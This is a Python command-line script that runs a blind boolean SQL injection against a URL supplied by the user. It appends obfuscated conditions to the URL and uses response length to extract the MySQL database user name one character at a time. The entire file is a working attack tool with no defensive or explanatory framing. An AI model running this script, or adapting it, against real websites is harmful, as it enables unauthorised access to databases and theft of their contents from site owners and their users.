import sys
import requests

def verify(url):
    payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

    print('start to retrive MySQL user:')
    user = ''
    for i in range(1, 21):
        for payload in payloads:
            s = "ascii(mid(lower(user()),%s,1))=%s" % (i, ord(payload))
            html_doc = requests.get('%s/**)*/and/**)*/%s' % (url, s), timeout=60)
            print ('.',)
            if len(html_doc.text) > 6000:
                user += payload
                print('\r[please wait] %s' % user)
                break
    print('\n[Done]MySQL user is', user)


def main():
    args = sys.argv


    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print("Usage: python %s url" % (args[0]))

if __name__ == '__main__':
    main()
